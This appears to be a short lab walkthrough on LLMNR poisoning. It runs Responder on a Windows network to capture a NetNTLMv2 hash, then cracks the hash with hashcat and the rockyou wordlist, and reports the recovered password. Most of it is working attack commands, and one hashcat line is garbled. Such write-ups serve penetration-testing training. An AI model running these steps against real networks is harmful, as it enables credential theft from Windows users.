# LMNR Poisoning
*responder -I eth0 -rdwv does not work on newer versions, instead it is responder -I eth0 -dwv*
### 1. Set up responder
**sudo responder -I eth0 -dwv**
*we are now listening for traffic*

### 2. Go to one of the windows machines and point it at your attacker machine, this is to simulate the type of activity that responder can intercept
**effectively search for the attack machines ip to create a log entry**
<img width="513" height="289" alt="Step 2 of LLMNR" src="https://github.com/user-attachments/assets/cf688553-5464-44da-a298-aa87a9f9566c" />

*this will not resolve but should let us pull down the hash*

<img width="470" height="157" alt="Hash from LMNR" src="https://github.com/user-attachments/assets/9ec94da0-90eb-4ccb-9ec4-8007a890f045" />


### 3. Use hashcat on the hash
1. nano hash.txt 
	- paste your hash into this file
2. hashcat --identify nano hash.txt
3. crack the hash 
4. hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt.gz --force

Explanation:

-**m 5600** = NetNTLMv2

-**a 0** = dictionary attack

-**--force** = needed sometimes in VM environments

<img width="470" height="239" alt="LMNR Hashcat results" src="https://github.com/user-attachments/assets/b49493a2-920e-408c-8722-c884369cbc4a" />

*Attack Complete: Password1!*
